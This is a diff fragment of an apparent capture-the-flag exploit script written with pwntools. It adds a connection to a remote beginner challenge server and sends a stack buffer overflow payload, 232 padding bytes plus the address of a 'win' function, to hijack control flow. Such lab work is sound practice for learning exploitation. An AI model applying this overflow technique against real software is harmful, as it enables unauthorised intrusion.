@@ -38,7 +38,7 @@ continue
 # PIE:      No PIE (0x400000)
 
 io = start()
-
+io = connect("challs.beginner.havce.it", 1347)
 io.sendlineafter(b"nome:", b"nome")
 io.sendlineafter(b"cognome:", b"A"*232+p64(exe.sym.win))
 
